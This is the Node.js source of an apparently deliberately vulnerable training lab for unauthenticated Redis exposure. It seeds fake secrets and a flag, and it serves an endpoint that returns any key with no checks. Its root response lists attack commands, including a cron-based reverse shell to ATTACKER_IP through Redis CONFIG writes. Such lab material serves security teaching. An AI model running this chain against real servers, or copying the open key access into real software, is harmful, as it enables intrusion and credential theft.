const express = require('express');
const { createClient } = require('redis');

const app = express();
app.use(express.json());

let redis;
(async () => {
  redis = createClient({ socket: { host: process.env.REDIS_HOST, port: 6379 } });
  await redis.connect();
  // Seed sensitive data
  await redis.set('admin_password', 'SuperSecretAdminPass!');
  await redis.set('api_master_key', 'sk-master-abc123def456xyz');
  await redis.set('jwt_secret', 'my-super-secret-jwt-key-do-not-share');
  await redis.set('stripe_secret_key', 'sk_live_FAKEKEYFORLAB123456789');
  await redis.hSet('user:1', { username: 'admin', password: 'admin123', role: 'admin', email: 'admin@corp.com' });
  await redis.hSet('user:2', { username: 'alice', password: 'alice_pass', role: 'user' });
  await redis.set('session:abc123', JSON.stringify({ userId: 1, role: 'admin' }));
  await redis.set('session:xyz789', JSON.stringify({ userId: 2, role: 'user' }));
  await redis.set('flag', 'FLAG{unauthenticated_redis_rce_achieved}');
  console.log('Redis seeded with sensitive data on port 6379 (no auth!)');
})();

// API that uses Redis (normal functionality)
app.get('/cache/:key', async (req, res) => {
  const val = await redis.get(req.params.key);
  res.json({ key: req.params.key, value: val });
});

app.get('/', (req, res) => res.json({
  lab: '19 - Unauthenticated Redis Exposure',
  redis_port: 6399,
  hint: 'Redis is exposed on host port 6399 with NO authentication! Connect directly with redis-cli',
  commands_to_try: [
    'redis-cli -h localhost -p 6399',
    'KEYS *',
    'GET admin_password',
    'GET jwt_secret',
    'GET flag',
    'CONFIG SET dir /tmp',
    'CONFIG SET dbfilename pwned.txt',
    'SET cron "\\n* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\n"',
    'CONFIG REWRITE'
  ]
}));

app.listen(3000, () => console.log('Lab 19 running on :3000'));
